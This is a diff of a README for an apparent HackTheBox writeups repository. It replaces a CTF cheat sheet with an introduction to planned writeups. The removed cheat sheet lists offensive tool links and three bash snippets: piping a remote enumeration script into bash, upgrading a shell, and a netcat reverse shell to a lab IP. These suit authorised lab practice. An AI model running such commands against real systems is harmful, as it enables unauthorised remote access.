@@ -1,49 +1,15 @@
-# ctf-notes
+# Writeups
 
-## Resources
+This repository is for guides and writeups for HackTheBox machines/challenges. Mainly for my own consumption.
 
-- [GTFOBins](https://gtfobins.github.io/) - List of unix binaries which can be exploited to escalate privileges etc.
-- [Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) - List of remote shells in various languages
-- [NetCat without -e](https://pen-testing.sans.org/blog/2013/05/06/netcat-without-e-no-problem/) - Reverse shell spawning when netcat does not support `-e`
-- [Exploit DB](https://www.exploit-db.com/) - Exploit DB
-- [Shell Upgrade Guide](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)
-- [Windows Privelege Escalation](https://guif.re/windowseop) - Windows privelege escalation
+I'm attempting to solve these challenges with a slight twist - I'll be trying to avoid third party tools as much as possible, and building my own solutions to complete the levels. Basically if it feels too easy to use a third party tool, or if I don't understand what's going on under the hood, I'll attempt to write my own version instead.
 
-## Tools
+I'm approaching the challenges from a software engineering background. I have an interest in security, but I have no formal training/certifications in this area so maybe that will appeal to those making the same approach to HTB. Or perhaps it'll make me completely ineffective :D
 
-_(skipping obvious stuff like metasploit, nmap, john etc.)_
+Writeups will be added once the solved challenges/machines are retired from HTB...
 
-### Port Scanning
-- [furious](https://github.com/liamg/furious)
+If you're coming to HTB for the first time, check out this brief [guide](GETTING_STARTED.md), or check out my [HTB hacking approach](APPROACH.md).
 
-### Fuzzing
-- [scout](https://github.com/liamg/scout) - Lightweight URL fuzzer
-- [gobuster](https://github.com/OJ/gobuster) - File/directory/DNS/VHOST buster
-- [wfuzz](https://tools.kali.org/web-applications/wfuzz) - Advanced web fuzzer
+## Published Writeups
 
-### Crypto
-- [pax](https://github.com/liamg/pax) - Padding oracle exploiter
-
-### Linux Enumeration
-- [LinEnum](https://github.com/rebootuser/LinEnum) - Linux enumeration script
-
-## Snippets
-
-### Linux Enumeration
-
-```bash
-curl -s https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
-```
-
-### Upgrade Shell
-
-```bash
-echo "import pty; pty.spawn('/bin/bash')" > /tmp/shell.py && python /tmp/shell.py
-```
-
-### Reverse Shell w/ max compatibility
-
-```bash
-rm /tmp/backpipe; mknod /tmp/backpipe p; /bin/sh 0</tmp/backpipe | nc 10.10.14.11 4445 1>/tmp/backpipe
-```
-
+*Nothing listed yet, come back soon*
